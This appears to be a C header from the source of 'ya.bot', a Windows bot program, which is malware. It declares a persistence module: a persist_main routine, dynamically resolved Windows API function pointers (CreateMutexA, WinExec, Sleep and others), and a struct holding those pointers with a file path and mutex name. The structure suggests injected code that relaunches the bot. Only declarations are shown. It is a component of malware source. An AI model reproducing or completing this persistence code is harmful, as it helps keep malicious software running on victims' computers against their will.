/*  ya.bot  */

#ifndef NO_PERSIST
bool persist_main(char *pszMutexName);

typedef bool (WINAPI *pCloseHandle)(HANDLE);
typedef HANDLE (WINAPI *pCreateFileA)(LPCTSTR,
		DWORD,
		DWORD,
		LPSECURITY_ATTRIBUTES,
		DWORD,
		DWORD,
		HANDLE);
typedef HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR);
typedef DWORD (WINAPI *pGetLastError)(void);
typedef bool (WINAPI *pReleaseMutex)(HANDLE);
typedef void (WINAPI *pSleep)(DWORD);
typedef UINT (WINAPI *pWinExec)(LPCTSTR, UINT);

struct SPersistInfo
{
	pCloseHandle m_fCloseHandle;
	pCreateFileA m_fCreateFileA;
	pCreateMutexA m_fCreateMutexA;
	pGetLastError m_fGetLastError;
	pReleaseMutex m_fReleaseMutex;
	pSleep m_fSleep;
	pWinExec m_fWinExec;
	char m_szFilePath[MAX_PATH];
	char m_szMutexName[MEDBUF];
};
#endif